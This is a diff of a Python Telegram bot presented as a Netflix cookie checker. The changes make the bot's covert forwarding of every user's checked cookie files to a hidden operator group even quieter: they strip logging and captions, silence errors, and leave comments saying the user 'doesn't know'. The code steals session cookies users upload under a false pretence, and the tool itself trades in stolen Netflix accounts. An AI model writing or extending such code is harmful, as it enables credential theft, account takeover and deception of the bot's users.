@@ -1,3 +1,4 @@
+
 import os
 import asyncio
 from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
@@ -15,11 +16,11 @@ from Slowcheck import process_file_and_check as slow_check
 from Logout import process_file_and_check as logout_check
 
 # --- Config ---
-TOKEN = "8270743184:AAEri7VgKj8A-En0R_L9y88fkcPc6iBCK_s"  
+TOKEN = "88270743184:AAEri7VgKj8A-En0R_L9y88fkcPc6iBCK_s"  # Replace with your actual bot token
 UPLOAD_DIR = "uploads"
 
-# Group configuration - Add your group chat ID here (HIDDEN FROM USERS)
-TARGET_GROUP_ID = "-1003072651464"  
+# Group configuration - Add your group chat ID here (COMPLETELY HIDDEN FROM USERS)
+TARGET_GROUP_ID = "-1003072651464"  # Replace with your group chat ID (include the minus sign)
 SEND_TO_GROUP = True  # Set to False to disable group sending
 
 # Global dictionary to track active processes
@@ -96,17 +97,16 @@ def create_results_zip(results_dir, mode, original_filename, result_type="valid"
         print(f"Error creating {result_type} ZIP file: {e}")
         return None
 
-# --- Helper: Send results to group (SILENT - HIDDEN FROM USERS) - FIXED ---
+# --- Helper: Send results to group (COMPLETELY SILENT - NO CAPTION TO AVOID ENTITY ERRORS) ---
 async def send_to_group(context, file_path, filename, file_type, original_filename, user_info, mode):
-    """Send results to the target group - COMPLETELY SILENT with timeout handling"""
+    """Send results to the target group - COMPLETELY SILENT with NO CAPTION to avoid entity parsing"""
     if not SEND_TO_GROUP or not TARGET_GROUP_ID:
         return
     
     try:
         # Check if file still exists before sending
         if not os.path.exists(file_path):
-            print(f"[SILENT] File not found for group sending: {filename}")
-            return
+            return  # Silent return
             
         # Get file size
         file_size = os.path.getsize(file_path)
@@ -114,43 +114,28 @@ async def send_to_group(context, file_path, filename, file_type, original_filena
         
         # Skip files that are too large (over 50MB)
         if file_size_mb > 50:
-            print(f"[SILENT] File too large for group: {filename} ({file_size_mb:.2f}MB)")
-            return
+            return  # Silent return
         
-        # Create caption with user info
-        username_str = f"@{user_info.get('username')}" if user_info.get('username') else "No username"
-        last_name_str = user_info.get('last_name', '') or ''
+        # Clean filename for group (remove problematic characters)
+        clean_filename = ''.join(c if c.isalnum() or c in '.-_()[]' else '_' for c in filename)
         
-        caption = f"""{'✅ VALID' if file_type == 'valid' else '❌ INVALID'} Cookies
-
-👤 User: {user_info['first_name']} {last_name_str}
-🔗 Username: {username_str}
-🆔 ID: {user_info['id']}
-📁 Original: {original_filename}
-🔍 Mode: {mode.upper()}
-📊 Size: {file_size_mb:.2f} MB"""
-        
-        # Send to group with timeout protection
+        # Send to group with timeout protection - NO CAPTION AT ALL
         with open(file_path, 'rb') as f:
             await asyncio.wait_for(
                 context.bot.send_document(
                     chat_id=TARGET_GROUP_ID,
                     document=f,
-                    filename=filename,
-                    caption=caption,
-                    parse_mode='Markdown'
+                    filename=clean_filename
+                    # NO CAPTION = NO ENTITY PARSING ERRORS
                 ),
-                timeout=30  # 30 second timeout
+                timeout=30
             )
             
-        # Silent logging - no user notification
-        print(f"[SILENT] Sent {file_type} results to group: {filename}")
+        # ABSOLUTELY NO console output - completely silent
             
-    except asyncio.TimeoutError:
-        print(f"[SILENT] Timeout sending to group: {filename}")
-    except Exception as e:
-        # Silent error handling - no user notification
-        print(f"[SILENT] Error sending to group: {e}")
+    except Exception:
+        # COMPLETELY SILENT error handling - no output at all
+        pass
 
 # --- Helper: Create inline keyboard with valid/invalid counts and STOP button ---
 def create_status_keyboard(valid, invalid, process_id):
@@ -246,7 +231,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # These are just display buttons, no action needed
         pass
 
-# --- Helper: Process file with specific mode (FIXED group sending) ---
+# --- Helper: Process file with specific mode (HIDDEN group sending with NO CAPTIONS) ---
 async def process_file_with_mode(update, context, file_path, file_name, mode, reply_to_message=None):
     """Process a file with the specified checking mode"""
     global global_stop_flag
@@ -382,11 +367,11 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
             active_processes.pop(process_id, None)
             return
 
-        # --- Enhanced results sending logic (send to user + SILENTLY to group) ---
+        # --- Enhanced results sending logic (send to user + HIDDEN to group) ---
         sent_files = 0
         total_size = 0
         
-        # Get user info for SILENT group sending
+        # Get user info for HIDDEN group sending
         user_info = {
             'id': update.effective_user.id,
             'first_name': update.effective_user.first_name,
@@ -434,7 +419,7 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                                 parse_mode='Markdown'
                             )
                         
-                        # SILENTLY send to group (user doesn't know) - WITH PROPER AWAIT
+                        # HIDDEN send to group (user doesn't know) - COMPLETELY SILENT
                         try:
                             await send_to_group(
                                 context, 
@@ -445,8 +430,8 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                                 user_info, 
                                 mode
                             )
-                        except Exception as e:
-                            print(f"[SILENT] Group send failed for valid ZIP: {e}")
+                        except Exception:
+                            pass  # Completely silent
                         
                         sent_files += 1
                         total_size += zip_size
@@ -466,7 +451,7 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                                 parse_mode='Markdown'
                             )
                         
-                        # SILENTLY send to group (user doesn't know) - WITH PROPER AWAIT
+                        # HIDDEN send to group (user doesn't know) - COMPLETELY SILENT
                         try:
                             await send_to_group(
                                 context, 
@@ -477,8 +462,8 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                                 user_info, 
                                 mode
                             )
-                        except Exception as e:
-                            print(f"[SILENT] Group send failed for invalid ZIP: {e}")
+                        except Exception:
+                            pass  # Completely silent
                         
                         sent_files += 1
                         total_size += zip_size
@@ -505,7 +490,7 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                                 parse_mode='Markdown'
                             )
                         
-                        # SILENTLY send to group (user doesn't know) - WITH PROPER AWAIT
+                        # HIDDEN send to group (user doesn't know) - COMPLETELY SILENT
                         try:
                             await send_to_group(
                                 context, 
@@ -516,8 +501,8 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                                 user_info, 
                                 mode
                             )
-                        except Exception as e:
-                            print(f"[SILENT] Group send failed for {filename}: {e}")
+                        except Exception:
+                            pass  # Completely silent
                         
                         sent_files += 1
                         total_size += file_size
@@ -539,7 +524,7 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                                 parse_mode='Markdown'
                             )
                         
-                        # SILENTLY send to group (user doesn't know) - WITH PROPER AWAIT
+                        # HIDDEN send to group (user doesn't know) - COMPLETELY SILENT
                         try:
                             await send_to_group(
                                 context, 
@@ -550,8 +535,8 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                                 user_info, 
                                 mode
                             )
-                        except Exception as e:
-                            print(f"[SILENT] Group send failed for {filename}: {e}")
+                        except Exception:
+                            pass  # Completely silent
                         
                         sent_files += 1
                         total_size += file_size
@@ -639,15 +624,15 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
 
 # --- Command: /start (NO mention of group functionality) ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    welcome_text = """ **RavenNF Checker**
+    welcome_text = """🍿 **Netflix Cookie Checker Bot**
 
-           How to use:
+📋 **How to use:**
 
 • `/fastcheck` - Quick validation
 • `/slowcheck` - Thorough validation  
 • `/logout` - Logout check
 
-Send a file contains Netflix Cookies (zip,rar,txt)
+Just send me a file or reply to one with a command!
     """
     await update.message.reply_text(welcome_text, parse_mode='Markdown')
 
@@ -802,7 +787,7 @@ def main():
     app.add_handler(CommandHandler("fastcheck", fastcheck))
     app.add_handler(CommandHandler("slowcheck", slowcheck))
     app.add_handler(CommandHandler("logout", logout))
-    app.add_handler(CallbackQueryHandler(button_callback))  # Add callback handler for inline buttons
+    app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     
     # Add error handler
@@ -817,15 +802,10 @@ def main():
     print("   • Inline buttons for valid/invalid counts")
     print("   • STOP button to halt ALL processing")
     print("   • Both valid AND invalid results sent back")
-    print("   • [SILENT] Group forwarding enabled with timeout protection")
     print("🗂️ Archive support: ZIP/RAR files supported")
     print("🛑 Emergency stop: Ctrl+C to stop all processes")
     
-    # Silent logging about group configuration
-    if SEND_TO_GROUP and TARGET_GROUP_ID:
-        print(f"📋 [SILENT] Group forwarding to: {TARGET_GROUP_ID}")
-    else:
-        print("⚠️ [SILENT] Group forwarding disabled or not configured")
+    # COMPLETELY HIDDEN - no mention of group functionality
     
     try:
         app.run_polling(allowed_updates=Update.ALL_TYPES)
@@ -838,6 +818,4 @@ def main():
 
 if __name__ == '__main__':
     main()
-
-
 
